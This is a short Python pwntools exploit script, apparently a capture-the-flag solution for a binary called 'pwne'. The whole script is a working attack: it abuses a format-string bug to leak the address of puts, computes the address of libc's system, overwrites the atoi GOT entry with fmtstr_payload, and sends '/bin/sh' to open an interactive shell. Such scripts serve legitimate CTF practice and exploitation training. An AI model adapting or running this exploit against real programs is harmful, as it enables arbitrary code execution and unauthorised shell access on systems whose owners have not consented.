# coding:utf-8
from pwn import *
elf = ELF('pwne')
# conn=remote('ip',port)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('./libc.so.6')
p = process('./pwne')
p.recvuntil('[Y/N]\n')
p.sendline('Y')
p.recvuntil('NAME:\n\n')
p.sendline(p32(elf.got['puts']) + '%7$s')
p.recvuntil('WELCOME \n')
puts_addr=p.recv()[4:8]
# print u32(put_addr)
system_addr = libc.symbols['system'] - libc.symbols['puts'] + u32(puts_addr)
atoi_got_addr = elf.got['atoi']
p.sendline('17')
p.recvuntil('[Y/N]\n')
p.sendline('Y')
p.recvuntil('NAME:\n\n')
p.sendline(fmtstr_payload(7, {atoi_got_addr: system_addr}))
p.recvuntil('GET YOUR AGE:\n\n')
p.sendline('/bin/sh\x00')
p.interactive()

